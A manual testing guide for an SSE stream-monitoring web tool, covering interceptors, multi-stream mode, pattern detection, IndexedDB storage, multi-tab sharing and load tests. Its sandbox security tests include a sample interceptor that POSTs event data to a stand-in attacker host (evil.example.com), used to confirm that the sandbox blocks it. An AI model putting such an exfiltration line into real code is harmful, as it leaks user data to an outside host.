# SSE-Tester — Deep Manual Testing Guide

> **Covers everything NOT in `TESTING_GUIDE.md`.**  
> That guide handles: chaos stream basics, basic filter/playback, schema, simple server, mock VCR export.  
> This guide covers: **interceptors, sandbox security, multi-stream, pattern detection, correlation tracing, cold storage / IDB replay, SharedWorker multi-tab, proxy auth, performance under load, and edge cases.**

---

## 🛠️ Prerequisites — Start All Test Servers

Open 4 terminals alongside `npm run dev`:

```powershell
# Terminal 1 – already running
npm run dev

# Terminal 2 – already running (or start it)
node test-servers/simple-server.js          # port 4001 — slow 5-event stream

# Terminal 3 – interceptor test scenarios
node test-servers/test-interceptor-server.js  # port 4002

# Terminal 4 – multi-stream (3 independent feeds)
node test-servers/test-multistream-server.js  # port 4003

# Terminal 5 – pattern/burst/correlation scenarios
node test-servers/test-pattern-server.js      # port 4004
```

Open **`http://localhost:3001`** in your browser.

---

## 🧬 Section 1 — Interceptor Pipeline

> **Goal:** Verify the Worker-based sandbox correctly transforms events, drops events, chains multiple interceptors, and handles malicious/broken code safely.

### 1.1 Connect to the interceptor server

1. In Monitor Mode, enter: `http://localhost:4002/plain`
2. Click **Connect** — you should see 20 events arriving at ~500ms intervals, each with `counter`, `value`, `type` fields.

---

### 1.2 Basic Transform Interceptor

1. Click **Interceptors** (the panel or header icon)
2. Add a new interceptor. Name it `"Double Value"`
3. Paste this code:

```js
return {
  ...event,
  data: JSON.stringify({
    ...JSON.parse(event.data),
    value: JSON.parse(event.data).value * 2
  })
};
```

**What to verify:**
- [ ] The `value` field in event cards shows **2×** the original (20, 40, 60…)
- [ ] The **Live Preview** panel shows the raw vs transformed diff
- [ ] Events still arrive at the same rate — the interceptor adds no visible lag

---

### 1.3 Drop Interceptor (null return)

1. Add a second interceptor. Name it `"Drop Odd"`  
2. Code:

```js
const d = JSON.parse(event.data);
if (d.counter % 2 !== 0) return null;
return event;
```

**What to verify:**
- [ ] Only **even-numbered** events appear in the list (counter: 2, 4, 6…)
- [ ] The event count in the status bar is **half** what you'd expect
- [ ] Disable the interceptor — odd events immediately reappear

---

### 1.4 Interceptor Chain Ordering

Add a third interceptor `"Tag Event"`:

```js
const d = JSON.parse(event.data);
return {
  ...event,
  data: JSON.stringify({ ...d, tag: 'processed-by-chain' })
};
```

**Drag to reorder** so the chain is: `Tag Event → Double Value → Drop Odd`

**What to verify:**
- [ ] Events have `tag: 'processed-by-chain'` AND doubled value AND only even arrive
- [ ] Reorder to `Drop Odd → Tag Event` — now odd events are dropped BEFORE tagging

---

### 1.5 Sandbox Security Tests

**Test A — Cannot access window:**

```js
const x = window.location.href;
return { ...event, data: x };
```
**Expected:** `window` is `undefined`. Event passes through unchanged with an error logged.

**Test B — Cannot exfiltrate via fetch:**

```js
fetch('https://evil.example.com', { method: 'POST', body: event.data });
return event;
```
**Expected:** `fetch` is `undefined`. Error shown in interceptor panel. Event passes through.

**Test C — Infinite loop is killed:**

```js
while (true) {}
return event;
```
**Expected:**
- [ ] UI stays responsive — the loop is running in a Worker, NOT the main thread
- [ ] After ~100ms, the interceptor times out and shows a "killed" error message
- [ ] Subsequent events still arrive and process normally

**Test D — Syntax error shows immediately:**

```js
return { ...event, data: INVALID SYNTAX HERE
```
**Expected:**
- [ ] Red compile error shown inline without connecting to the server
- [ ] Other interceptors in the chain still run

---

### 1.6 PII Redaction Test

1. Disconnect, change URL to `http://localhost:4002/sensitive`
2. Connect — you'll see events with `password`, `creditCard`, `ssn`, `apiKey` fields
3. Add interceptor `"Redact PII"`:

```js
const d = JSON.parse(event.data);
const piiFields = ['password', 'creditCard', 'ssn', 'apiKey', 'token'];
const redacted = Object.fromEntries(
  Object.entries(d).map(([k, v]) =>
    piiFields.includes(k) ? [k, '[REDACTED]'] : [k, v]
  )
);
return { ...event, data: JSON.stringify(redacted) };
```

**What to verify:**
- [ ] `password`, `creditCard`, `ssn`, `apiKey` all show as `[REDACTED]` in cards
- [ ] `user`, `action`, `amount` fields still visible
- [ ] Export JSON — verify the exported file also has `[REDACTED]` (interceptors are applied before storage)

---

### 1.7 Throughput Under Interceptors

1. URL: `http://localhost:4002/rapid` — sends 200 events instantly
2. Have 2 interceptors active simultaneously
3. Check `filterExecMs` in the PerfOverlay (Stats toggle)

**What to verify:**
- [ ] All 200 events appear within a few seconds
- [ ] UI stays responsive (no freeze)
- [ ] `filterExecMs` stays under 50ms per pass

---

## 🌊 Section 2 — Multi-Stream Mode

> **Goal:** Verify that 3 independent streams can be added, connected, merged, and individually controlled.

### 2.1 Add Three Streams

1. Click **Multi-Stream Mode** in the header
2. Add stream: Name `"User Events"`, URL `http://localhost:4003/stream-a`
3. Add stream: Name `"Payments"`, URL `http://localhost:4003/stream-b`
4. Add stream: Name `"System"`, URL `http://localhost:4003/stream-c`
5. Click **Connect** on each

**What to verify:**
- [ ] Each stream shows a distinct **color lane** in the merged event list
- [ ] Events from different streams are interleaved by arrival time
- [ ] Each stream card shows its own connection status and event count
- [ ] Stream A fires at 600ms, B at 800ms, C at 1000ms — visible as different densities

---

### 2.2 Individual Stream Control

1. **Disconnect Stream B** (Payments) — click its disconnect button
2. Observe: Stream A and C events continue; no more payment events appear
3. **Reconnect Stream B**
4. Verify it catches up — some events may have been missed (this is expected; multi-stream has no SharedWorker catchup)

---

### 2.3 Per-Stream Event Filtering

1. While all 3 streams are connected, use the **Search bar**
2. Type `streamId: "A"` — verify only Stream A events appear
3. Use **Query bar**: `type=payment` — verify only payment events appear
4. **Clear** — all streams merge again

---

### 2.4 Stream Collapse and Clear

1. Click the **Clear** button on Stream B individually
2. Verify: Stream B count resets to 0; Streams A and C are unaffected
3. Remove Stream C entirely
4. Verify: the merged view no longer has System events

---

## 🔍 Section 3 — Pattern Detection

> **Goal:** Verify burst detection, frequency rules, gap detection, and alert dismissal.

### 3.1 Burst Detection

1. Connect Monitor Mode to: `http://localhost:4004/burst-test`
2. Open the **Pattern Detection** panel
3. The stream is calm for 6s (1 event/sec), then sends 20 events in ~1.5s

**What to verify:**
- [ ] During the calm phase: **no alert fires**
- [ ] When the burst arrives: a **"Burst Detected"** alert appears
- [ ] Alert shows the event type that burst (`alert`)
- [ ] Dismiss the alert — it should **NOT** immediately re-fire for the same burst window
- [ ] After the burst settles back to calm: no new alert fires

---

### 3.2 Custom Frequency Rule

1. Connect to `http://localhost:4004/frequency`
2. In Pattern Detection, add a rule:
   - **Type:** Frequency
   - **Event type:** `error`
   - **Threshold:** 4 events per minute

Wait ~12s (the server sends `error` every 3s — so 4 errors in 12s should trigger the rule).

**What to verify:**
- [ ] Alert fires when 4+ `error` events have arrived within 60s
- [ ] Alert shows which rule triggered it
- [ ] `info` events (600ms cadence) do NOT trigger the rule
- [ ] Toggle the rule off — no more alerts, even if errors keep coming

---

### 3.3 Burst During Historical Replay

> This tests the `arrivalTime` fix — patterns should use event timestamps, not `Date.now()`.

1. Connect to `http://localhost:4004/burst-test`, wait for full stream to complete (~14s)
2. **Pause** playback immediately after all events arrive
3. Export the session as `.sse-record`
4. Switch to **Mock Server Mode**, upload the recording, **Start Server**
5. Back in Monitor Mode, connect to the mock URL
6. Set **Play Speed** to 2× (fast)

**What to verify:**
- [ ] Pattern detection triggers at the **same relative position** in the stream as during live playback
- [ ] The burst alert fires during the burst segment, NOT randomly scattered through the replay
- [ ] After dismissing the alert mid-replay, it does **NOT** re-fire for the same burst

---

### 3.4 Alert Dismissal Regression

> Verifies the `clearAlerts` bug fix — dismissed alerts should not re-fire.

1. Connect to `http://localhost:4004/burst-test`
2. Let burst fire — alert appears
3. Click **Dismiss** on the alert
4. Wait through the calm phase after the burst
5. No new burst occurs, but verify the alert remains dismissed

**What to verify:**
- [ ] Alert stays gone
- [ ] If you click **Clear All Alerts**, the alert disappears permanently (does NOT re-fire on the next event)

---

## 🔗 Section 4 — Correlation Tracing

> **Goal:** Verify that events sharing a `traceId` field are grouped and chains can be inspected.

### 4.1 Basic Trace Grouping

1. Connect Monitor Mode to `http://localhost:4004/correlated`
2. This sends 12 events across 3 trace groups (`T-001`, `T-002`, `T-003`), each with stages: `request → processing → db_query → response`
3. Open the **Correlation Tracing** panel

**What to verify:**
- [ ] **Trace count** shows 3 traces (T-001, T-002, T-003)
- [ ] Click `T-001` — shows the 4 events in order: request → processing → db_query → response
- [ ] Each event in the chain card shows its `seq`, `stage`, `svc` fields
- [ ] The trace timeline shows the correct progression

---

### 4.2 Trace Across the Multi-Stream

1. Start both `test-multistream-server.js` AND `test-pattern-server.js`
2. In Multi-Stream Mode, add all 3 multi-stream endpoints
3. Check Correlation Tracing — the multi-stream server also sends `traceId: trace-1` through `trace-5`

**What to verify:**
- [ ] Traces appear even though events come from different stream instances
- [ ] Filtering by a specific trace shows events from **multiple streams** in the correct order

---

### 4.3 Clear Traces

1. While traces are populated, click **Clear Traces**
2. Verify: Trace count resets to 0; the panel is empty
3. New events arriving continue to build fresh traces

---

## 💾 Section 5 — Cold Storage (IndexedDB)

> **Goal:** Verify events are persisted to IDB, can be scrolled back to, and replayed correctly.

### 5.1 Verify IDB Storage Is Active

1. Connect to the chaos stream — let 200+ events accumulate
2. In the **Stats** panel, look for **"Events in Storage"** or `totalStoredCount`

**What to verify:**
- [ ] Count increases as events arrive (IDB writing is asynchronous and incremental)
- [ ] `idbAvailable` shows `true` in the stats

---

### 5.2 Load Older Events (Pre-Buffer Scroll)

1. Let 500+ events arrive (the ring buffer holds 1000, but IDB has everything)
2. Scroll to the **bottom** of the event list
3. Click **Load More** (or trigger the `loadBefore` action)

**What to verify:**
- [ ] Older events appear below the current list
- [ ] Events are in chronological order (oldest at bottom)
- [ ] No events are skipped (check that seq numbers are continuous)

---

### 5.3 Full Storage Replay

1. Connect, accumulate 50+ events, then **disconnect**
2. Click **Replay from Storage** (if present) or use `replayFromStorage`
3. Events should flood back into the event list loaded from IDB

**What to verify:**
- [ ] Events appear in the same order as they originally arrived
- [ ] Events with **duplicate arrivalTime** (rare but possible with rapid streams) are NOT skipped
- [ ] Filter/search works correctly on replayed events
- [ ] If you replay 100k+ events: the **cap** safely limits it (no OOM freeze)

---

### 5.4 Clear Storage

1. Click **Clear Storage**
2. Reconnect to the same URL

**What to verify:**
- [ ] `totalStoredCount` resets to 0
- [ ] IDB is empty — no old events leak back in

---

### 5.5 Multi-Tab IDB (onblocked behaviour)

> Tests the `onblocked → warn (not reject)` fix.

1. Open **two tabs** of `http://localhost:3001`
2. Connect both to the same stream
3. In Tab 1: trigger a storage clear while Tab 2 is still reading from IDB

**What to verify:**
- [ ] No console error saying "IDB blocked — database access permanently failed"
- [ ] You should see a `console.warn` about onblocked if it fires, but the app continues normally
- [ ] Both tabs keep working after the operation

---

## 🌐 Section 6 — SharedWorker Multi-Tab

> **Goal:** Verify that two tabs share one SSE connection and one tab gets catchup events.

### 6.1 Two-Tab Connection Sharing

1. Open `http://localhost:3001` in **Tab 1**
2. Connect to `http://localhost:4001/stream` (simple server — 5 events at 2s each)
3. Wait for events 1 and 2 to arrive in Tab 1
4. Open **Tab 2** (`http://localhost:3001`) and connect to the **same URL**

**What to verify:**
- [ ] Tab 2 shows events 1 and 2 as **catch-up events** immediately on connect (from the SharedWorker buffer)
- [ ] Both tabs then receive events 3, 4, 5 simultaneously
- [ ] In **DevTools → Network**: only **ONE** SSE request is made (Tab 2 piggybacked on Tab 1's connection)

---

### 6.2 Tab Close and Zombie Timeout

1. Tab 1 is connected; Tab 2 is also connected
2. Close Tab 2
3. Close Tab 1 (the last tab)
4. Wait 60+ seconds (zombie timer)

**What to verify:**
- [ ] In the browser DevTools (background Service Worker tab), the SharedWorker is alive during 60s
- [ ] After 60s, the worker closes the EventSource (check memory — no leak)
- [ ] Reconnecting in a new tab starts fresh

---

### 6.3 Reconnect After Tab Wake

1. Connect to the chaos stream in one tab
2. Let it run for 2 minutes
3. Switch to another browser tab for 5+ minutes (browser may throttle background tabs)
4. Switch back

**What to verify:**
- [ ] The connection is still live (ping/pong keeps it alive)
- [ ] OR the 3-attempt auto-reconnection fires and re-establishes the stream
- [ ] Events don't duplicate on reconnection

---

## 🔐 Section 7 — Proxy & Auth

> **Goal:** Verify that the Vite proxy correctly injects auth tokens and routes remote URLs.

### 7.1 Bearer Token Injection

1. Enter a URL in the connection form
2. Also enter a **Bearer Token** (any string, e.g. `test-token-123`)
3. Connect

**What to verify:**
- [ ] In **DevTools → Network → EventStream request headers**: the `Authorization: Bearer test-token-123` header is present (injected by the Vite proxy plugin)
- [ ] OR the token appears as `?auth=test-token-123` in the proxy URL for external streams

---

### 7.2 Local vs Remote URL Routing

Test these URLs and verify the proxy routes correctly:

| URL | Expected Behavior |
|---|---|
| `/stream` | Direct (no proxy) — relative path |
| `http://localhost:4001/stream` | Direct — localhost stripped to pathname |
| `http://external.example.com/events` | Proxied through `/api/sse?url=…` |

In DevTools Network tab, verify the actual request URL matches the expected proxy behavior.

---

### 7.3 Body Size Guard on Mock Upload

1. Switch to **Mock Server Mode**
2. Try to upload a `.sse-record` file **larger than 10 MB**
3. You can create a fake large file with PowerShell: `[IO.File]::WriteAllText("huge.txt", "x" * 11MB)`

**What to verify:**
- [ ] Upload is rejected with an error message (not a server crash)
- [ ] The error appears as `uploadError` state in the UI (not a browser `alert()` box)
- [ ] Normal-sized `.sse-record` files still upload correctly

---

## ⚡ Section 8 — Performance Under Load

> **Goal:** Stress-test the ring buffer, filter worker, and rendering pipeline.

### 8.1 Load Stream (50,000 events)

1. Connect to `http://localhost:4000/load-stream` (requires the chaos server running: `node test-servers/test-chaos-server.js`)
2. Watch the event list

**What to verify:**
- [ ] UI stays responsive — you can scroll, click, switch panels during the flood
- [ ] Events stop at **1,000** in the visible list (ring buffer cap), but total count in stats shows more
- [ ] `filterExecMs` in the PerfOverlay stays reasonable (check Stats panel)
- [ ] Memory in DevTools stays bounded — not growing linearly

---

### 8.2 Filter Worker Speed

While connected to the load stream:
1. Type `type=load` in the Query bar
2. Observe the `filterExecMs` value

**What to verify:**
- [ ] Filter executes in the worker (UI doesn't freeze)
- [ ] `filterExecMs` should be well under 50ms for 1,000 events
- [ ] Clearing the query instantly restores the full list

---

### 8.3 PerfContext Isolation (Re-render Verification)

> This tests the key architectural fix — PerfOverlay re-renders should not cascade.

1. Open **React DevTools** (install extension if needed)
2. Enable **Highlight Updates** in React DevTools
3. Connect to the chaos stream

**What to verify:**
- [ ] When events arrive, you see the `PerfOverlay` component highlight (it re-renders)
- [ ] `EventsList`, `ConnectionPanel`, `CustomFiltersPanel` do NOT highlight on every event
- [ ] Only components that actually consume data that changed should re-render

---

### 8.4 Massive Payload Test

1. Connect to `http://localhost:4000/massive-payload`
2. This sends 2 events with ~30,000-key objects each (the chaos server must be running)

**What to verify:**
- [ ] Both events appear in the list
- [ ] Schema inference handles the 30,000-field object without freezing (500ms debounce)
- [ ] The diff view between event 1 and event 2 renders without crashing
- [ ] Memory usage doesn't spike uncontrollably

---

## 🧪 Section 9 — Mock Server / VCR Mode

> Extends the basic VCR test in TESTING_GUIDE.md.

### 9.1 Speed Control

1. Upload `sample.sse-record` or an exported recording
2. Start the mock server
3. Connect Monitor Mode to the mock stream URL
4. Change **Speed** from 1× to **0.5×** (half speed)

**What to verify:**
- [ ] Events arrive at exactly **2× the original interval** (e.g. if original was 500ms, now 1000ms)
- [ ] Change to **4×** — events now arrive at 125ms intervals
- [ ] Speed control knob is reflected in the mock URL query params (`?speed=…`)

---

### 9.2 Loop Mode

1. Start mock server with **Loop enabled**
2. Connect and watch the stream complete

**What to verify:**
- [ ] After the last event, the stream **starts over from the beginning** without disconnecting
- [ ] The event list keeps appending (not clearing between loops)
- [ ] Toggle Loop **off** mid-loop — server stops after the current pass completes

---

### 9.3 Timing Accuracy

> Tests the `arrivalTime` fix in replayUtils.

1. Export a recording with the simple server: connect to `http://localhost:4001/stream`, wait for all 5 events (2s apart), then export as `.sse-record`
2. Upload and play at 1× speed

**What to verify:**
- [ ] Events arrive at approximately **2-second intervals** during mock playback
- [ ] The delta between events is accurate to milliseconds (not rounded to whole seconds)
- [ ] No "midnight crossover" issue (events near midnight still have correct deltas)

---

## 🗂️ Section 10 — Profiles & Workspace State

### 10.1 Save and Load Profile

1. Enter URL `http://localhost:4001/stream` and Bearer Token `test-token`
2. Enter Profile Name `Simple Server`
3. Click **Save Profile**

**What to verify:**
- [ ] Profile appears in the profile list
- [ ] Click it — URL and token fields fill automatically
- [ ] Refresh the page — profile is persisted (stored in localStorage or similar)

---

### 10.2 Profile Delete

1. Delete the `Simple Server` profile
2. Verify it's gone from the list
3. Refresh — still gone

---

## 🔲 Section 11 — UI & Edge Cases

### 11.1 Connect / Disconnect Cycle

1. Connect → wait 5s → Disconnect
2. Connect again to the same URL

**What to verify:**
- [ ] Event list **does NOT clear** on reconnect unless explicitly requested
- [ ] `Connected` status updates correctly
- [ ] Connection timer resets to 0 on each new connection

---

### 11.2 Empty Query / Filter Behaviour

1. Type something in Query bar, then **delete it**
2. Verify: full event list restores, `filteredEvents` === `allEvents`
3. Add a custom filter with **no active values selected**
4. Verify: no filtering occurs (empty filter set = show all)

---

### 11.3 Copy to Clipboard

1. Click the **Copy** button on any event
2. Open Notepad and paste

**What to verify:**
- [ ] Raw event data is copied correctly
- [ ] The copy button shows a **checkmark** for 1.5 seconds then reverts
- [ ] Copying a second event while the first check is showing also works

---

### 11.4 Diff View Between Adjacent Events

1. Connect to any stream, let 10+ events accumulate
2. Click **Compare/Diff** on event #5
3. Verify a diff is shown against event #6 (the one before it)
4. Click Diff on event #1 (newest)

**What to verify:**
- [ ] Diff shows added/removed/changed fields color-coded
- [ ] Diffing the first event (no previous) either shows a clear "no previous event" state or shows the full event as all-added

---

### 11.5 Dark / Light Theme Toggle

1. Click the theme toggle
2. Verify all panels, the event list, and the timeline switch cleanly
3. Refresh — theme preference is persisted

---

### 11.6 Event Search Across All Fields

Search for: `12:00` — should match events whose timestamp contains that string  
Search for: `burst` — matches event type  
Search for: `999` — matches event ID or data value  

**What to verify:**
- [ ] Search is case-insensitive
- [ ] Results update instantly (worker-backed, no lag)
- [ ] Clearing search restores all events

---

## ✅ Test Completion Checklist

Use this to track your progress:

### Interceptors
- [ ] Basic transform works
- [ ] Drop (null return) works
- [ ] Chain ordering verifiably matters
- [ ] `window` is undefined in sandbox
- [ ] `fetch` is undefined in sandbox
- [ ] Infinite loop is killed and UI stays responsive
- [ ] Syntax errors caught before execution
- [ ] PII redaction works end-to-end

### Multi-Stream
- [ ] 3 streams connect independently
- [ ] Events interleaved by arrival time with color coding
- [ ] Individual stream disconnect/reconnect
- [ ] Per-stream clear doesnt affect others

### Pattern Detection
- [ ] Burst alert fires during burst
- [ ] Burst alert does not re-fire after dismiss
- [ ] Frequency rule fires at correct threshold
- [ ] Pattern detection works during mock replay (uses arrivalTime)

### Correlation Tracing
- [ ] Traces groupby traceId
- [ ] Request→response chain visible in correct order
- [ ] Clear traces works

### Cold Storage
- [ ] Events written to IDB (totalStoredCount increases)
- [ ] Load older events works (loadBefore)
- [ ] Replay from storage loads in order
- [ ] Clear storage empties IDB

### SharedWorker
- [ ] Tab 2 gets catchup events from Tab 1's buffer
- [ ] Only one SSE connection in DevTools Network
- [ ] Reconnect after tab wake works

### Proxy & Auth
- [ ] Bearer token injected in headers
- [ ] Local URLs bypass proxy, external URLs route through /api/sse
- [ ] 10MB upload guard rejects large files with error state (not alert())

### Performance
- [ ] 50k events: ring buffer caps at 1000 visible
- [ ] filterExecMs stays bounded
- [ ] React re-renders: only PerfOverlay lights up on event arrival

### Mock Server
- [ ] Speed control changes event interval correctly
- [ ] Loop mode restarts stream after completion
- [ ] Timing accurate to milliseconds (not seconds)

### UI/Edge Cases
- [ ] Reconnect preserves event history
- [ ] Empty filter shows all events
- [ ] Copy button works and provides feedback
- [ ] Diff view shows correct changes
- [ ] Theme persists across refresh
